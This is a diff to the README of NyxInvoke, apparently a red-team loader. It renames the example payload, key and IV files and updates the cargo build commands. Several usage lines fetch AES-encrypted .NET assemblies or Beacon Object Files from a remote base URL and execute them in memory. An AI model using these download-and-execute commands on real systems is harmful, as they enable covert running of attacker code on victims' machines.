@@ -54,12 +54,12 @@ Where `<mode>` is one of: `clr`, `ps`, or `bof`.
 
 1. Remote Execution:
    ```
-   NyxInvoke.exe clr --base https://example.com/resources --key key.bin --iv iv.bin --assembly payload.exe --args arg1 arg2
+   NyxInvoke.exe clr --base https://example.com/resources --key clr_aes.key --iv clr_aes.iv --assembly clr_data.enc --args arg1 arg2
    ```
 
 2. Local Execution:
    ```
-   NyxInvoke.exe clr --key C:\path\to\key.bin --iv C:\path\to\iv.bin --assembly C:\path\to\payload.exe --args arg1 arg2
+   NyxInvoke.exe clr --key C:\path\to\clr_aes.key --iv C:\path\to\clr_aes.iv --assembly C:\path\to\clr_data.enc --args arg1 arg2
    ```
 
 3. Compiled Execution:
@@ -88,12 +88,12 @@ Where `<mode>` is one of: `clr`, `ps`, or `bof`.
 
 1. Remote Execution:
    ```
-   NyxInvoke.exe bof --base https://example.com/resources --key key.bin --iv iv.bin --bof payload.o --args "str=argument1" "int=42"
+   NyxInvoke.exe bof --base https://example.com/resources --key bof_aes.key --iv bof_aes.iv --bof bof_data.enc --args "str=argument1" "int=42"
    ```
 
 2. Local Execution:
    ```
-   NyxInvoke.exe bof --key C:\path\to\key.bin --iv C:\path\to\iv.bin --bof C:\path\to\payload.o --args "str=argument1" "int=42"
+   NyxInvoke.exe bof --key C:\path\to\bof_aes.key --iv C:\path\to\bof_aes.iv --bof C:\path\to\bof_data.enc --args "str=argument1" "int=42"
    ```
 
 3. Compiled Execution:
@@ -127,11 +127,11 @@ In the `resources` directory, you'll find several files to test NyxInvoke's func
 To build NyxInvoke with compiled-in CLR or BOF data:
 
 ```
-cargo build --release --features compiled_clr
+cargo +nightly build --release --target=x86_64-pc-windows-msvc
 ```
 or
 ```
-cargo build --release --features compiled_bof
+cargo +nightly build --release --features=compiled_bof,compiled_clr
 ```
 
 ## Dependencies
